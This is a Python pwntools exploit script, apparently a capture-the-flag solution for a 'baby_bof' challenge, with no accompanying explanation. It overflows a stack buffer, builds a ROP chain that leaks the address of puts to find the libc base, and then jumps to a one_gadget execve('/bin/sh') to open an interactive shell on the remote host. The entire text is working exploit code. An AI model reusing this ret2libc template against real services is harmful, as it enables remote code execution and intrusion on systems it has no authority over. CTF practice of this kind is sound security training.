#!/usr/bin/env python3

from pwn import *
context.log_level = "debug"

HOST = "dctf-chall-baby-bof.westeurope.azurecontainer.io"
PORT =7481
e = ELF("./baby_bof")
conn = process([e.path, e.path])
conn = remote(HOST, PORT)

pop_rdi = 0x0000000000400683 #: pop rdi ; ret
pop_r12_pop_r13_pop_r14_pop_r15 = 0x000000000040067c #: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
libc_puts_offset = 0x875a0
one_gadget = 0xe6c7e #execve("/bin/sh", r15, r12)

payload = b"a" * (0x12)
payload += p64(pop_rdi)
payload += p64(e.got["puts"])
payload += p64(e.plt["puts"])
payload += p64(e.symbols["main"])

conn.sendlineafter("plz don't rop me", payload)
conn.sendline(payload)
libc_addr = u64([conn.recv() for v0 in range(2)][1][29:35] + p16(0)) - libc_puts_offset

print(hex(libc_addr))

payload = b"a" * (0x12)
payload += p64(pop_r12_pop_r13_pop_r14_pop_r15)
payload += p64(0) * 4
payload += p64(libc_addr+one_gadget)
conn.sendline(payload)
conn.interactive()
